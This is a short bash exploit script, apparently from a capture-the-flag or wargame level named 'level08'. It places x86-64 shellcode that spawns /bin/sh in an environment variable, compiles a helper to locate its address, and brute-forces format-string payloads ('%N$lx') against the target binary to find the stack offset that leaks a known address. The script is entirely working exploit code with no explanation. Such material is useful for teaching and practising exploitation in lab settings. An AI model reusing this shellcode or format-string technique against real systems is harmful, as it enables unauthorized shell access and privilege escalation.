#!/bin/bash
export SHELLCODE="$(echo -ne "\x48\x31\xc0\x48\x31\xf6\x48\x31\xd2\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05")"
bin="/home/users/level08/level08"

getenv="/tmp/getenv"
gcc "$getenv.c" -o "$getenv"
dst="$($getenv "SHELLCODE")"

get_offset_answ(){
    rev < "/home/users/level08/backups/.log" | cut -d' ' -f1 | rev
}
offset=43
while [[ $offset -lt 60 ]]; do
    payload="%$offset\$lx"
    "$bin" "$payload" &>"/dev/null"
    answ="$(get_offset_answ)"
    [[ "$answ" == "400ab3" ]] && break
    ((offset++))
done
echo "$offset: $answ"
echo "dst: $dst"
